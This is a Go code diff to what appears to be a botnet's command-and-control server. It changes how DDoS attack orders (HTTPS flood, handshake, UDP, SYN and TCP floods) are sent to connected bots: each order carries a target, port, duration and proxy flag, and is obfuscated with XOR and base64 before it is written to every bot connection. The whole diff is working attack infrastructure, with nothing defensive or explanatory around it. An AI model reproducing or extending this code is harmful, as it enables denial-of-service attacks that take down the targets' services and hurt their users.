@@ -3,6 +3,7 @@ package server
 import (
 	"encoding/base64"
 	"fmt"
+	"homo/network/config"
 	"net"
 
 	"strconv"
@@ -43,17 +44,39 @@ func sendCmd(command_type string, target string, port string, duration string) {
 }
 
 func Https(target string, duration string, port string) {
-	fmt.Println(target, port, duration)
-	sendCmd("https", target, port, duration)
+
+	fmt.Println(strconv.FormatBool(config.GetConfig().Proxy.Useproxy))
+	for _, conn := range Conns {
+		var command string
+
+		for _, i := range "https" + " " + target + " " + port + " " + duration + " " + strconv.FormatBool(config.GetConfig().Proxy.Useproxy) {
+			command += string(i ^ 29>>3)
+		}
+
+		_, err := conn.Write([]byte(base64.RawStdEncoding.EncodeToString([]byte(command))))
+
+		if err != nil {
+			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Error"))
+			Conns = RemoveConn(Conns, conn)
+			conn.Close()
+		} else {
+			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Command sent"))
+		}
+	}
 
 }
 
-func Slowloris(target string, duration string, port string) {
-	sendCmd("slowloris", target, port, duration)
+func Handshake(target string, duration string, port string) {
+	sendCmd("handshake", target, port, duration)
+
 }
 
 func Udpmix(target string, duration string, port string) {
 	sendCmd("udpmix", target, port, duration)
+}
+
+func Syn(target string, duration string, port string) {
+	sendCmd("syn", target, port, duration)
 }
 
 func Tcpmix(target string, duration string, port string) {
